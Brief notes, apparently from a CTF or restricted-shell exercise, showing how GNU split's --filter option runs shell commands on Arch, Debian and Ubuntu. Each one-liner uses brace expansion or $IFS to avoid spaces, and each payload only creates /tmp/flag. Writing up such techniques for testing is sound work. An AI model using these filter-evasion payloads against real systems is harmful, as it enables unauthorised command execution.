## archlinux (split 8.28)
Allows for `{,}` format:
```
split --filter='{touch,/tmp/flag}' /proc/self/status
```

## debian (split 8.26)
Allows for `$IFS`, but not `{,}` format:
```
split --filter='touch$IFS/tmp/flag' /proc/self/status
```

## ubuntu (split 8.25)
Allows for `$IFS`, but not `{,}` format:
```
split --filter='touch$IFS/tmp/flag' /proc/self/status
```
